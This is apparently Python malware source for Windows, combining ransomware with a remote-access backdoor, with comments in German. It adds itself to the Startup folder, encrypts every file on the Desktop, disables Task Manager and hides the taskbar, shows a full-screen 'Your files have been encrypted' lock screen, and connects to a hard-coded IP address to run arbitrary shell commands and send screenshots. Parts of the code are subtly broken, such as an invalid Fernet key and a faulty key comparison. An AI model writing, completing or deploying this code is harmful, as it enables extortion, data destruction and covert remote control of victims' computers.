import os
import socket
import subprocess
from PIL import ImageGrab
from cryptography.fernet import Fernet
import traceback
import time
import tkinter as tk
import ctypes
import threading

# Decryption Key
ENCRYPTION_KEY = b'rehguriehiehehj46246'

# Autostart hinzufügen
def add_to_startup():
    try:
        # Pfad zur Python-Datei
        file_path = os.path.realpath(__file__)
        
        # Pfad zum Autostart-Ordner
        startup_folder = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Verknüpfung erstellen
        shortcut_path = os.path.join(startup_folder, "system_startup.lnk")
        
        # Verknüpfung zur Python-Datei
        shell = ctypes.windll.shell32
        shortcut = shell.SHGetSpecialFolderPathW(0, 2, False)
        subprocess.run(['cmd', '/c', f'copy "{file_path}" "{shortcut_path}"'], shell=True)
    except Exception as e:
        print("Error adding to startup:", e)

def send_screenshot(conn):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as f:
            conn.sendall(f.read())
        os.remove('screenshot.png')
    except Exception as e:
        pass

def receive_command(conn):
    try:
        command = conn.recv(1024).decode()
        return command
    except Exception as e:
        pass

def execute_command(command, conn):
    try:
        if command.startswith('run '):
            cmd = command[4:]
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        elif command == 'screenshot':
            send_screenshot(conn)
            return "Screenshot sent"
        else:
            return "Unknown command"
    except Exception as e:
        pass

def encrypt_files(key):
    try:
        fernet = Fernet(key)
        target_dir = os.path.expanduser('~/Desktop')  # Target the Desktop folder first
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
    except Exception as e:
        pass

def decrypt_files(key):
    try:
        fernet = Fernet(key)
        target_dir = os.path.expanduser('~/Desktop')  # Decrypt files on the Desktop first
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()
                decrypted_data = fernet.decrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(decrypted_data)
    except Exception as e:
        pass

def disable_task_manager_and_taskbar():
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
        subprocess.run("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
        ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowA(b"Shell_TrayWnd", None), 0)
    except Exception as e:
        pass

def enable_task_manager_and_taskbar():
    try:
        subprocess.run("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f", shell=True)
        ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowA(b"Shell_TrayWnd", None), 5)
    except Exception as e:
        pass

def kill_task_manager():
    try:
        while True:
            subprocess.run("taskkill /f /im taskmgr.exe", shell=True)
            time.sleep(1)
    except Exception as e:
        pass

def show_fullscreen_message():
    def verify_decryption_key():
        entered_key = entry.get()
        if entered_key.encode() == ENCRYPTION_KEY.decode():
            decrypt_files(ENCRYPTION_KEY)
            root.destroy()  # Bildschirm schließen
            enable_task_manager_and_taskbar()

    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", disable_event)

    root.configure(background="black")
    message = tk.Label(root, text="Your files have been encrypted", font=("Arial", 40), fg="red", bg="black")
    message.pack(expand=True)

    entry = tk.Entry(root, font=("Arial", 20))
    entry.pack()

    button = tk.Button(root, text="Decrypt", command=verify_decryption_key, font=("Arial", 20))
    button.pack()

    root.config(cursor="none")
    root.mainloop()

def disable_event():
    pass

def keep_trying_connection():
    host = '84.186.219.154'
    port = 12347
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                while True:
                    command = receive_command(s)
                    if command == 'exit':
                        break
                    result = execute_command(command, s)
                    s.sendall(result.encode())
        except Exception as e:
            time.sleep(10)
            continue

def main():
    add_to_startup()  # Autostart hinzufügen
    encrypt_files(ENCRYPTION_KEY)  # Verschlüssele Dateien auf dem Desktop
    disable_task_manager_and_taskbar()  # Deaktiviere Task-Manager und Taskleiste
    threading.Thread(target=kill_task_manager, daemon=True).start()  # Task-Manager killen
    threading.Thread(target=keep_trying_connection, daemon=True).start()  # Verbindung aufbauen
    show_fullscreen_message()  # Zeige Vollbildnachricht

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        enable_task_manager_and_taskbar()
